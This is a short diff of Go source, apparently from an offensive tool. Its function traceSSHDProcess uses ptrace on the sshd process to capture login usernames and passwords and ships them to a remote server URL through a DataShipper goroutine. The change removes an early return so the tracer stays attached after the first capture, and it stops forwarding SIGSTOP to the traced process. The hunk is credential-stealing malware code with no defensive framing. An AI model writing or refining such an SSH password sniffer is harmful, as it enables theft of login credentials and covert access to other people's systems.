@@ -91,14 +91,16 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 								}
 								go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 								shipped = true
-								return
 							}
 						}
 					}
 				}
 			}
 		} else if wstatus.Stopped() {
-			sigToDeliver = int(wstatus.StopSignal())
+			sig := wstatus.StopSignal()
+			if sig != syscall.SIGSTOP {
+				sigToDeliver = int(sig)
+			}
 		}
 
 		if err := syscall.PtraceSyscall(pid, sigToDeliver); err != nil {
